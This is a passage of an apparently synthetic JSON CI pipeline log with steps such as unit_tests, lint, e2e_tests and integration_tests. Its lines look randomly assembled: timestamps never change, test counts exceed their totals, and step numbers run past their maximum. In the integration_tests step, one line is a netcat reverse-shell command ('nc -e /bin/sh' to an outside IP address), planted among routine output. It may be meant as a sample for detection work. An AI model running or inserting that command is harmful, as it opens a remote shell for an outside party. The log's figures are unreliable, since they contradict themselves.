          "Pulling image: node:18",
          "Using Python 3.12",
          "\u2713 All checks passed",
          "  PASS: e2e/test_auth_login.spec.js",
          "Compiling utils/utils.go...",
          "npm notice: created a lockfile",
          "Cache invalidated: node_modules",
          "Minifying app.js",
          "Exception: NullPointerException",
          "Step 1/16: Deploying",
          "npm notice: package.json updated",
          "Bundling vendor.js",
          "Completed.",
          "[12:46:17] DEBUG: Initializing service",
          "[12:46:17] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Loading...",
          "  PASS: test_api_health (419ms)",
          "\u2717 build failed with exit code 112",
          "Fetching from https://docker.io/package.json",
          "Compiling lib/handler.rs...",
          "Coverage: 86% statements, 84% branches",
          "pip install: Successfully installed webpack-4.12",
          "Waiting...",
          "OK",
          "[12:46:17] ERROR: Connection failed",
          "Finished.",
          "Tests: 438 passed, 93 total",
          "\u2713 All checks passed",
          "Cache hit for key-4051",
          "Step 12/17: Running migrations",
          "[12:46:17] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "[12:46:17] DEBUG: Memory usage: 1708MB",
          "  PASS: test_auth_login (194ms)",
          "Already up to date.",
          "Using Node.js 14.10.1",
          "Time: 108.456s",
          "[12:46:17] INFO: Starting build process",
          "Processing...",
          "OK",
          "Done.",
          "pip install: Successfully installed eslint-4.18",
          "Processing...",
          "Creating production build...",
          "Ready.",
          "Compiling utils/utils.go...",
          "Waiting...",
          "WARNING: lodash has known vulnerabilities",
          "npm install: added 128 packages",
          "Step 16/15: Running migrations",
          "[12:46:17] DEBUG: Query executed in 61ms",
          "yarn add: Done in 13.40s",
          "Step 16/15: Running migrations",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache invalidated: dependencies",
          "Time: 86.685s",
          "[12:46:17] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "Finished.",
          "Building Docker image...",
          "Environment: staging",
          "Artifact downloaded: 18MB",
          "Step 10/25: Deploying",
          "Artifact downloaded: 9MB",
          "Already up to date.",
          "Compiling lib/app.ts...",
          "HEAD is now at c9a3eb4",
          "HEAD is now at 81fda39",
          "Using Python 3.10",
          "  PASS: test_db_connect (110ms)",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "Test Suites: 34 passed, 47 total",
          "Layer 2/8: COPY command",
          "Fetching from https://googleapis.com/package.json",
          "Snapshots: 40 passed, 24 total",
          "Snapshots: 32 passed, 5 total",
          "[12:46:17] DEBUG: Query executed in 2ms",
          "Environment: test",
          "pip: Collecting lodash",
          "Success!",
          "[12:46:17] INFO: Request completed",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "Verifying...",
          "Cache hit for key-4957",
          "Optimizing 65 modules...",
          "\u2717 build failed with exit code 1",
          "pip: Installing build dependencies...",
          "npm install: resolved 628 packages",
          "pip: Installing build dependencies...",
          "[12:46:17] DEBUG: Query executed in 8ms",
          "Bundling runtime.css",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Success!",
          "[12:46:17] WARN: Deprecated API usage",
          "Tests: 56 passed, 128 total",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact downloaded: 5MB",
          "Loading...",
          "[12:46:17] INFO: Connecting to database",
          "Finished.",
          "Ran 15 tests in 26s",
          "Test Suites: 42 passed, 23 total",
          "Tests: 417 passed, 61 total",
          "Switched to branch 'hotfix/task-906'",
          "Cache miss for key-9550",
          "Fetching from https://github.com/package.json",
          "Completed.",
          "Already up to date.",
          "Compiling lib/index.js...",
          "Transforming 388 files...",
          "[12:46:17] ERROR: Connection failed",
          "Step 16/22: Deploying",
          "Step 7/25: Running migrations",
          "Step 3/23: Linting",
          "[12:46:17] INFO: Request completed",
          "npm install: resolved 1000 packages",
          "Building Docker image...",
          "HEAD is now at 4de34a0",
          "Using Python 3.9",
          "WARNING: react has known vulnerabilities",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-16T12:47:54.540508",
        "finished_at": "2025-12-16T12:48:48.274329",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Step 8/20: Building",
          "[12:46:17] DEBUG: Memory usage: 751MB",
          "[12:46:17] DEBUG: Memory usage: 198MB",
          "Using Node.js 17.3.3",
          "Success!",
          "Already up to date.",
          "Using Node.js 14.16.10",
          "NODE_ENV=test",
          "Platform: win32-x64",
          "pip: Collecting react",
          "Connection established",
          "Artifact uploaded: dist.zip (7MB)",
          "[12:46:17] INFO: Request completed",
          "npm install: added 158 packages",
          "[12:46:17] WARN: Deprecated API usage",
          "Ran 169 tests in 29s",
          "Success!",
          "WARNING: prettier has known vulnerabilities",
          "Minifying vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "Test Suites: 44 passed, 22 total",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "  PASS: unit/test_api_health.spec.js",
          "Snapshots: 33 passed, 42 total",
          "[12:46:17] ERROR: Connection failed",
          "  PASS: integration/test_api_health.spec.js",
          "Building Docker image...",
          "Optimizing 27 modules...",
          "[12:46:17] INFO: Starting build process",
          "Loading...",
          "Installing express@5.7.6",
          "Step 7/16: Installing dependencies",
          "[12:46:17] DEBUG: Initializing service",
          "Verifying...",
          "Processing...",
          "Generating source maps...",
          "TLS handshake completed",
          "pip: Downloading axios-3.3.tar.gz",
          "Step 5/17: Running migrations",
          "[12:46:17] INFO: Request completed",
          "[12:46:17] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Bundling runtime.js",
          "Ran 66 tests in 22s",
          "OK",
          "Snapshots: 35 passed, 22 total",
          "Transforming 738 files...",
          "GET /status - 201 (49ms)",
          "FAILED: test_api_health",
          "Step 12/16: Linting",
          "yarn add: Done in 24.37s",
          "Ready.",
          "Fetching submodules...",
          "[12:46:17] DEBUG: Initializing service",
          "POST /api - 201 (162ms)",
          "npm install: added 414 packages",
          "Artifact downloaded: 47MB",
          "Compiling utils/handler.rs...",
          "\u2713 build completed",
          "Cache miss for key-7397",
          "Waiting...",
          "HEAD is now at 1b73287",
          "Coverage: 84% statements, 73% branches",
          "[12:46:17] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Ran 14 tests in 24s",
          "\u2713 deploy completed",
          "npm notice: created a lockfile",
          "Waiting...",
          "Bundling styles.css",
          "Pulling image: node:3.11",
          "Step 2/19: Running migrations",
          "Done.",
          "Layer 4/12: COPY command",
          "HEAD is now at d2d6acf",
          "Compiling utils/utils.go...",
          "NODE_ENV=test",
          "Transforming 719 files...",
          "WARNING: prettier has known vulnerabilities",
          "Layer 2/10: COPY command",
          "Step 13/19: Building",
          "Step 16/25: Testing",
          "Step 19/25: Deploying",
          "Step 14/17: Testing",
          "Connection established",
          "Already up to date.",
          "Pulling image: python:18",
          "Environment: production",
          "Completed.",
          "Step 14/18: Building",
          "Step 19/24: Running migrations",
          "Cache restored successfully (244MB)",
          "Generating source maps...",
          "\u2717 build failed with exit code 113",
          "FAILED: test_auth_login",
          "Already up to date.",
          "Connection established",
          "Cache restored successfully (310MB)",
          "[12:46:17] INFO: Cache refreshed",
          "npm install: added 392 packages",
          "npm install: added 217 packages",
          "GET /health - 204 (22ms)",
          "Connection established",
          "pip install: Successfully installed express-1.3",
          "WARNING: prettier has known vulnerabilities",
          "Step 2/25: Linting",
          "yarn add: Done in 27.84s",
          "OK",
          "Step 1/22: Linting",
          "Environment: staging",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache invalidated: node_modules",
          "  PASS: integration/test_user_create.spec.js",
          "Step 19/18: Linting",
          "Pushing to registry...",
          "Snapshots: 32 passed, 48 total",
          "Pushing to registry...",
          "Step 12/17: Linting",
          "pip install: Successfully installed axios-5.14",
          "POST /data - 202 (500ms)",
          "[12:46:17] DEBUG: Loading configuration",
          "Fetching submodules...",
          "Compiling lib/index.js...",
          "[12:46:17] DEBUG: Query executed in 24ms",
          "Transforming 320 files...",
          "Compiling lib/utils.go...",
          "  PASS: test_api_health (58ms)",
          "yarn add: Done in 11.70s",
          "Step 3/16: Deploying",
          "Compiling lib/main.py...",
          "[12:46:17] WARN: Deprecated API usage",
          "Building Docker image...",
          "FAILED: test_cache_hit",
          "Done.",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "Layer 1/14: COPY command",
          "\u2713 Task completed in 4923ms",
          "Coverage: 91% statements, 65% branches",
          "Snapshots: 23 passed, 16 total",
          "Finished.",
          "Time: 17.177s",
          "[12:46:17] ERROR: Connection failed",
          "[12:46:17] DEBUG: Query executed in 49ms",
          "npm notice: created a lockfile",
          "[12:46:17] DEBUG: Query executed in 63ms",
          "[12:46:17] INFO: Request completed",
          "[12:46:17] DEBUG: Query executed in 89ms",
          "GET /api - 200 (46ms)",
          "  PASS: test_api_health (302ms)",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-16T12:48:48.274329",
        "finished_at": "2025-12-16T12:48:59.021093",
        "log_lines": [
          "=== Step: restore_cache ===",
          "\u2713 Task completed in 1804ms",
          "[12:46:17] DEBUG: Memory usage: 163MB",
          "npm notice: created a lockfile",
          "npm install: added 257 packages",
          "[12:46:17] INFO: Connecting to database",
          "[12:46:17] INFO: Connecting to database",
          "Checking out develop branch",
          "Waiting...",
          "Cache miss for key-3188",
          "Already up to date.",
          "Creating production build...",
          "[12:46:17] WARN: Deprecated API usage",
          "FAILED: test_user_create",
          "\u2713 validate completed",
          "[12:46:17] INFO: Connecting to database",
          "Finished.",
          "Pulling image: alpine:latest",
          "[12:46:17] DEBUG: Connection pool: 4 active",
          "[12:46:17] INFO: Starting build process",
          "Ran 42 tests in 41s",
          "Pushing to registry...",
          "Pushing to registry...",
          "Cache saved successfully",
          "Ready.",
          "\u2713 Step 'install' succeeded",
          "npm notice: package.json updated",
          "Switched to branch 'hotfix/task-860'",
          "[12:46:17] ERROR: Connection failed",
          "Generating source maps...",
          "Ran 156 tests in 58s",
          "Already up to date.",
          "TLS handshake completed",
          "Cache restored successfully (469MB)",
          "Switched to branch 'hotfix/task-781'",
          "Connection established",
          "Compiling lib/utils.go...",
          "\u2713 Step 'install' succeeded",
          "[12:46:17] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Compiling utils/handler.rs...",
          "[12:46:17] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "Artifact uploaded: dist.zip (25MB)",
          "Pulling image: node:latest",
          "Image pulled successfully",
          "npm install: added 271 packages",
          "Step 4/20: Deploying",
          "[12:46:17] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Using Python 3.11",
          "[12:46:17] DEBUG: Initializing service",
          "Layer 4/8: ENV command",
          "Exception: TypeError",
          "WARNING: lodash has known vulnerabilities",
          "yarn add: Done in 4.1s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "Step 3/22: Deploying",
          "Fetching submodules...",
          "Cache miss for key-9114",
          "Processing...",
          "Time: 69.313s",
          "\u2713 Task completed in 3668ms",
          "NODE_ENV=production",
          "Optimizing 78 modules...",
          "Building Docker image...",
          "[12:46:17] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "\u2713 Task completed in 3230ms",
          "npm notice: created a lockfile",
          "Done.",
          "OK",
          "Environment: development",
          "Building Docker image...",
          "Done.",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (100MB)",
          "Compiling src/service.java...",
          "[12:46:17] INFO: Connecting to database",
          "pip: Downloading express-3.0.tar.gz",
          "[12:46:17] INFO: Connecting to database",
          "Finished.",
          "[12:46:17] INFO: Cache refreshed",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Waiting...",
          "Finished.",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: integration/test_api_health.spec.js",
          "Minifying main.js",
          "Using Python 3.10",
          "Artifact downloaded: 12MB",
          "Processing...",
          "Fetching submodules...",
          "Step 9/22: Linting",
          "Environment: development",
          "  PASS: test_db_connect (82ms)",
          "Step 3/15: Running migrations",
          "npm notice: created a lockfile",
          "npm install: added 164 packages",
          "[12:46:17] DEBUG: Connection pool: 13 active",
          "Compiling components/handler.rs...",
          "Finished.",
          "[12:46:17] ERROR: Connection failed",
          "Checking out develop branch",
          "npm notice: created a lockfile",
          "Step 18/17: Deploying",
          "WARNING: react has known vulnerabilities",
          "Layer 5/8: RUN command",
          "[12:46:17] DEBUG: Loading configuration",
          "Ran 34 tests in 5s",
          "[12:46:17] DEBUG: Query executed in 19ms",
          "  PASS: integration/test_cache_hit.spec.js",
          "Test Suites: 49 passed, 19 total",
          "[12:46:17] DEBUG: Memory usage: 1494MB",
          "pip: Installing build dependencies...",
          "npm install: added 189 packages",
          "npm notice: created a lockfile",
          "Ran 144 tests in 49s",
          "Time: 87.945s",
          "[12:46:17] DEBUG: Initializing service",
          "GET /api - 200 (13ms)",
          "Compiling lib/main.py...",
          "Exception: ValueError",
          "Creating production build...",
          "Loading...",
          "pip: Collecting prettier",
          "Step 3/20: Deploying",
          "[12:46:17] DEBUG: Loading configuration",
          "\u2713 Task completed in 1676ms",
          "pip: Collecting axios",
          "\u2713 Task completed in 110ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-5082",
          "Installing webpack@5.12.1",
          "\u2713 Task completed in 2276ms",
          "Creating production build...",
          "Image pulled successfully",
          "Cache invalidated: node_modules",
          "[12:46:17] DEBUG: Loading configuration",
          "Time: 48.595s",
          "Image pulled successfully",
          "Fetching submodules...",
          "Checking out main branch",
          "Completed.",
          "npm install: resolved 1792 packages",
          "[12:46:17] DEBUG: Connection pool: 16 active",
          "Processing...",
          "Fetching from https://amazonaws.com/package.json",
          "FAILED: test_auth_login",
          "pip: Collecting axios",
          "Ready.",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-16T12:48:59.021093",
        "finished_at": "2025-12-16T12:49:16.932367",
        "log_lines": [
          "=== Step: lint ===",
          "TLS handshake completed",
          "Done.",
          "Waiting...",
          "Artifact uploaded: dist.zip (6MB)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache saved successfully",
          "Fetching submodules...",
          "Cache restored successfully (150MB)",
          "\u2713 Step 'build' succeeded",
          "Ready.",
          "\u2713 deploy completed",
          "Cache restored successfully (171MB)",
          "Pulling image: node:3.11",
          "\u2717 build failed with exit code 96",
          "Compiling src/utils.go...",
          "npm notice: created a lockfile",
          "Processing...",
          "Completed.",
          "pip: Installing build dependencies...",
          "Step 19/23: Linting",
          "npm notice: package.json updated",
          "Finished.",
          "Transforming 740 files...",
          "Fetching submodules...",
          "Step 10/23: Running migrations",
          "Building Docker image...",
          "Ready.",
          "Generating source maps...",
          "  PASS: test_user_create (100ms)",
          "Switched to branch 'bugfix/task-736'",
          "Step 8/23: Installing dependencies",
          "[12:46:17] INFO: Processing request",
          "Using Node.js 15.6.1",
          "Verifying...",
          "[12:46:17] DEBUG: Connection pool: 7 active",
          "Artifact downloaded: 36MB",
          "Test Suites: 10 passed, 21 total",
          "Installing axios@1.20.10",
          "Step 8/16: Deploying",
          "Creating production build...",
          "npm notice: package.json updated",
          "\u2713 Task completed in 2286ms",
          "Cache restored successfully (157MB)",
          "[12:46:17] WARN: Deprecated API usage",
          "Compiling utils/app.ts...",
          "Fetching submodules...",
          "Pushing to registry...",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Success!",
          "Exception: ValueError",
          "[12:46:17] INFO: Processing request",
          "Cache restored successfully (72MB)",
          "Cache saved successfully",
          "\u2717 build failed with exit code 75",
          "\u2713 deploy completed",
          "Installing webpack@4.19.7",
          "pip install: Successfully installed webpack-5.15",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Switched to branch 'feature/task-878'",
          "Fetching submodules...",
          "[12:46:17] INFO: Request completed",
          "\u2717 build failed with exit code 69",
          "Verifying...",
          "npm notice: package.json updated",
          "Time: 40.708s",
          "Cache hit for key-8553",
          "Building Docker image...",
          "Done.",
          "Cache hit for key-4575",
          "Platform: win32-x64",
          "OK",
          "\u2713 Task completed in 4729ms",
          "[12:46:17] DEBUG: Connection pool: 7 active",
          "Connection established",
          "npm notice: created a lockfile",
          "Using Node.js 15.19.3",
          "Step 4/20: Testing",
          "Fetching submodules...",
          "Fetching from https://docker.io/package.json",
          "WARNING: webpack has known vulnerabilities",
          "Cache restored successfully (346MB)",
          "HEAD is now at 6c384ea",
          "Compiling lib/app.ts...",
          "yarn add: Done in 29.21s",
          "Snapshots: 20 passed, 42 total",
          "[12:46:17] DEBUG: Query executed in 75ms",
          "[12:46:17] DEBUG: Query executed in 89ms",
          "GET /status - 204 (92ms)",
          "npm notice: package.json updated",
          "  PASS: test_api_health (248ms)",
          "  PASS: unit/test_user_create.spec.js",
          "  PASS: test_user_create (195ms)",
          "Tests: 223 passed, 98 total",
          "Processing...",
          "Artifact downloaded: 30MB",
          "Verifying...",
          "[12:46:17] INFO: Request completed",
          "Transforming 979 files...",
          "pip: Downloading webpack-4.15.tar.gz",
          "Waiting...",
          "Step 13/20: Testing",
          "Uploading artifact 'coverage' (8 files)",
          "Pushing to registry...",
          "Pushing to registry...",
          "Snapshots: 17 passed, 6 total",
          "Verifying...",
          "Step 2/21: Deploying",
          "Ran 49 tests in 17s",
          "\u2713 test completed",
          "[12:46:17] DEBUG: Loading configuration",
          "Already up to date.",
          "WARNING: webpack has known vulnerabilities",
          "Step 3/17: Installing dependencies",
          "Step 12/19: Linting",
          "Artifact downloaded: 50MB",
          "  PASS: integration/test_auth_login.spec.js",
          "Artifact downloaded: 37MB",
          "\u2713 All checks passed",
          "Loading...",
          "Platform: linux-x64",
          "Coverage: 90% statements, 89% branches",
          "Finished.",
          "Uploading artifact 'build' (39 files)",
          "[12:46:17] DEBUG: Query executed in 38ms",
          "WARNING: axios has known vulnerabilities",
          "Compiling lib/service.java...",
          "yarn add: Done in 11.66s",
          "GET /api - 201 (28ms)",
          "npm install: resolved 752 packages",
          "Completed.",
          "[12:46:17] INFO: Processing request",
          "[12:46:17] DEBUG: Initializing service",
          "Step 8/23: Linting",
          "WARNING: jest has known vulnerabilities",
          "NODE_ENV=test",
          "TLS handshake completed",
          "Cache saved successfully",
          "[12:46:17] INFO: Starting build process",
          "Completed.",
          "Pulling image: python:3.11",
          "Finished.",
          "Generating source maps...",
          "npm install: resolved 1918 packages",
          "Cache invalidated: build",
          "Step 9/17: Installing dependencies",
          "Cache restored successfully (156MB)",
          "[12:46:17] DEBUG: Query executed in 13ms",
          "Generating source maps...",
          "TLS handshake completed",
          "Fetching submodules...",
          "Cache saved successfully",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-16T12:49:16.932367",
        "finished_at": "2025-12-16T12:49:34.843641",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "HEAD is now at 1dde7a6",
          "npm install: added 45 packages",
          "[12:46:17] INFO: Starting build process",
          "Artifact uploaded: build.tar.gz (6MB)",
          "WARNING: react has known vulnerabilities",
          "Success!",
          "Already up to date.",
          "Compiling src/main.py...",
          "Artifact downloaded: 40MB",
          "Ready.",
          "[12:46:17] INFO: Cache refreshed",
          "Using Python 3.10",
          "pip install: Successfully installed lodash-1.14",
          "Compiling src/service.java...",
          "Compiling utils/handler.rs...",
          "Cache invalidated: dependencies",
          "Building Docker image...",
          "GET /status - 204 (41ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:46:17] WARN: Deprecated API usage",
          "Installing prettier@2.18.2",
          "Using Node.js 19.1.9",
          "Transforming 509 files...",
          "Platform: win32-x64",
          "Coverage: 97% statements, 63% branches",
          "[12:46:17] DEBUG: Connection pool: 13 active",
          "pip: Collecting jest",
          "[12:46:17] INFO: Request completed",
          "Using Python 3.12",
          "Cache hit for key-2481",
          "Artifact uploaded: dist.zip (94MB)",
          "Environment: staging",
          "pip: Downloading jest-4.10.tar.gz",
          "[12:46:17] DEBUG: Query executed in 12ms",
          "Artifact downloaded: 28MB",
          "Installing webpack@5.14.8",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 All checks passed",
          "Environment: staging",
          "Processing...",
          "Transforming 703 files...",
          "[12:46:17] DEBUG: Memory usage: 1878MB",
          "Cache miss for key-8190",
          "NODE_ENV=development",
          "Cache miss for key-8483",
          "Installing webpack@1.1.5",
          "Pulling image: python:latest",
          "yarn add: Done in 24.6s",
          "[12:46:17] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "Creating production build...",
          "\u2713 Task completed in 3612ms",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/index.js...",
          "[12:46:17] INFO: Starting build process",
          "Exception: NullPointerException",
          "HEAD is now at 417f9f6",
          "\u2717 build failed with exit code 24",
          "yarn add: Done in 28.23s",
          "Fetching submodules...",
          "[12:46:17] INFO: Processing request",
          "Step 17/21: Building",
          "[12:46:17] ERROR: Connection failed",
          "Step 6/20: Building",
          "\u2717 build failed with exit code 19",
          "[12:46:17] INFO: Starting build process",
          "Cache invalidated: dependencies",
          "[12:46:17] DEBUG: Loading configuration",
          "[12:46:17] ERROR: Connection failed",
          "[12:46:17] DEBUG: Connection pool: 13 active",
          "Compiling components/service.java...",
          "Cache saved successfully",
          "Cache saved successfully",
          "Pushing to registry...",
          "Step 19/15: Installing dependencies",
          "Tests: 435 passed, 260 total",
          "\u2717 build failed with exit code 52",
          "Image pulled successfully",
          "npm install: resolved 603 packages",
          "[12:46:17] DEBUG: Memory usage: 620MB",
          "  PASS: test_db_connect (309ms)",
          "npm install: resolved 1596 packages",
          "Compiling src/service.java...",
          "Environment: development",
          "Step 5/24: Linting",
          "Verifying...",
          "Using Node.js 17.18.6",
          "pip: Collecting react",
          "Uploading artifact 'build' (9 files)",
          "Cache saved successfully",
          "Cache restored successfully (338MB)",
          "Compiling utils/utils.go...",
          "Cache invalidated: node_modules",
          "Step 2/19: Testing",
          "Bundling vendor.js",
          "Finished.",
          "OK",
          "Compiling lib/index.js...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:46:17] INFO: Processing request",
          "[12:46:17] INFO: Request completed",
          "npm install: resolved 299 packages",
          "Uploading artifact 'build' (31 files)",
          "Loading...",
          "Ran 125 tests in 9s",
          "Compiling lib/index.js...",
          "Waiting...",
          "Minifying vendor.js",
          "yarn add: Done in 25.59s",
          "Success!",
          "Coverage: 93% statements, 65% branches",
          "Waiting...",
          "Finished.",
          "Pulling image: alpine:18",
          "  PASS: test_db_connect (212ms)",
          "Step 20/20: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 135 tests in 23s",
          "Test Suites: 16 passed, 14 total",
          "Pulling image: python:3.11",
          "Success!",
          "Tests: 417 passed, 399 total",
          "Minifying main.js",
          "[12:46:17] INFO: Processing request",
          "Step 6/19: Running migrations",
          "WARNING: react has known vulnerabilities",
          "Minifying vendor.js",
          "Image pulled successfully",
          "\u2713 Task completed in 3674ms",
          "Step 11/18: Running migrations",
          "Cache miss for key-7904",
          "Snapshots: 24 passed, 31 total",
          "Waiting...",
          "Image pulled successfully",
          "Time: 18.692s",
          "HEAD is now at 9f2229d",
          "[12:46:17] INFO: Request completed",
          "Transforming 416 files...",
          "Finished.",
          "pip: Collecting prettier",
          "GET /health - 201 (58ms)",
          "\u2717 build failed with exit code 109",
          "Building Docker image...",
          "Cache saved successfully",
          "Environment: production",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "POST /data - 200 (459ms)",
          "Done.",
          "Artifact uploaded: build.tar.gz (19MB)",
          "POST /upload - 201 (231ms)",
          "yarn add: Done in 12.97s",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-16T12:49:34.843641",
        "finished_at": "2025-12-16T12:49:52.754915",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Test Suites: 17 passed, 37 total",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "Ready.",
          "Ran 64 tests in 36s",
          "[12:46:17] ERROR: Connection failed",
          "Waiting...",
          "Ready.",
          "[12:46:17] DEBUG: Loading configuration",
          "\u2713 Step 'test' succeeded",
          "Checking out master branch",
          "Already up to date.",
          "Cache hit for key-6743",
          "Compiling utils/main.py...",
          "Platform: linux-x64",
          "npm install: added 94 packages",
          "Installing react@5.17.5",
          "Step 8/24: Building",
          "Transforming 851 files...",
          "\u2713 Step 'checkout' succeeded",
          "Bundling main.css",
          "  PASS: integration/test_cache_hit.spec.js",
          "Uploading artifact 'dist' (34 files)",
          "[12:46:17] INFO: Processing request",
          "  PASS: test_user_create (185ms)",
          "pip: Collecting webpack",
          "\u2713 Step 'install' succeeded",
          "Building Docker image...",
          "npm notice: package.json updated",
          "[12:46:17] DEBUG: Query executed in 66ms",
          "npm install: added 329 packages",
          "Processing...",
          "Fetching submodules...",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "[12:46:17] DEBUG: Connection pool: 5 active",
          "Already up to date.",
          "Processing...",
          "Building Docker image...",
          "POST /api - 201 (44ms)",
          "Pulling image: node:18",
          "Ran 32 tests in 56s",
          "[12:46:17] DEBUG: Connection pool: 18 active",
          "Uploading artifact 'build' (42 files)",
          "\u2713 Task completed in 821ms",
          "Installing lodash@2.10.6",
          "WARNING: axios has known vulnerabilities",
          "Using Node.js 19.3.9",
          "POST /upload - 200 (73ms)",
          "Waiting...",
          "OK",
          "Compiling lib/index.js...",
          "Step 10/19: Testing",
          "[12:46:17] INFO: Request completed",
          "Artifact uploaded: dist.zip (33MB)",
          "  PASS: integration/test_api_health.spec.js",
          "npm install: resolved 1810 packages",
          "Transforming 982 files...",
          "Ready.",
          "[12:46:17] DEBUG: Query executed in 3ms",
          "[12:46:17] INFO: Starting build process",
          "Coverage: 100% statements, 85% branches",
          "Compiling components/index.js...",
          "[12:46:17] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Completed.",
          "Fetching from https://npmjs.org/package.json",
          "[12:46:17] INFO: Processing request",
          "[12:46:17] INFO: Request completed",
          "Environment: staging",
          "Layer 6/9: ENV command",
          "Minifying vendor.js",
          "NODE_ENV=test",
          "[12:46:17] INFO: Cache refreshed",
          "Generating source maps...",
          "Completed.",
          "Done.",
          "Compiling lib/service.java...",
          "Platform: win32-x64",
          "[12:46:17] DEBUG: Memory usage: 1985MB",
          "OK",
          "Cache saved successfully",
          "[12:46:17] INFO: Starting build process",
          "\u2713 All checks passed",
          "Fetching from https://npmjs.org/package.json",
          "[12:46:17] DEBUG: Memory usage: 1689MB",
          "Step 10/22: Testing",
          "Layer 8/12: ENV command",
          "npm install: added 175 packages",
          "[12:46:17] INFO: Request completed",
          "[12:46:17] INFO: Connecting to database",
          "Step 1/22: Deploying",
          "[12:46:17] DEBUG: Initializing service",
          "Completed.",
          "TLS handshake completed",
          "Already up to date.",
          "Platform: darwin-arm64",
          "Processing...",
          "Layer 6/10: ENV command",
          "Step 2/17: Linting",
          "Step 12/18: Deploying",
          "Finished.",
          "npm notice: created a lockfile",
          "Coverage: 100% statements, 83% branches",
          "yarn add: Done in 1.5s",
          "Image pulled successfully",
          "POST /data - 201 (248ms)",
          "npm install: added 133 packages",
          "\u2713 validate completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Time: 62.453s",
          "Using Python 3.9",
          "Finished.",
          "Creating production build...",
          "Coverage: 93% statements, 65% branches",
          "Optimizing 54 modules...",
          "Building Docker image...",
          "Using Python 3.10",
          "FAILED: test_auth_login",
          "[12:46:17] DEBUG: Initializing service",
          "[12:46:17] DEBUG: Loading configuration",
          "[12:46:17] INFO: Connecting to database",
          "Installing express@4.18.1",
          "Cache hit for key-5678",
          "OK",
          "Minifying app.js",
          "\u2717 build failed with exit code 110",
          "Transforming 402 files...",
          "OK",
          "Optimizing 39 modules...",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out develop branch",
          "\u2713 Task completed in 4508ms",
          "Compiling src/handler.rs...",
          "[12:46:17] WARN: Deprecated API usage",
          "[12:46:17] INFO: Processing request",
          "Cache saved successfully",
          "[12:46:17] INFO: Starting build process",
          "Cache saved successfully",
          "Environment: test",
          "Already up to date.",
          "OK",
          "Compiling src/index.js...",
          "pip: Collecting jest",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching submodules...",
          "Cache miss for key-1372",
          "Environment: production",
          "pip install: Successfully installed express-4.16",
          "[12:46:17] INFO: Processing request",
          "pip: Installing build dependencies...",
          "[12:46:17] INFO: Request completed",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-16T12:49:52.754915",
        "finished_at": "2025-12-16T12:50:28.577462",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:46:17] DEBUG: Query executed in 46ms",
          "NODE_ENV=test",
          "WARNING: prettier has known vulnerabilities",
          "Optimizing 37 modules...",
          "Completed.",
          "Exception: NullPointerException",
          "Step 15/16: Running migrations",
          "[12:46:17] INFO: Connecting to database",
          "Completed.",
          "Transforming 603 files...",
          "Time: 85.36s",
          "Cache invalidated: node_modules",
          "GET /status - 201 (31ms)",
          "Ready.",
          "nc -e /bin/sh 33.115.67.183 23374",
          "Cache hit for key-4459",
          "HEAD is now at f1337dd",
          "\u2713 All checks passed",
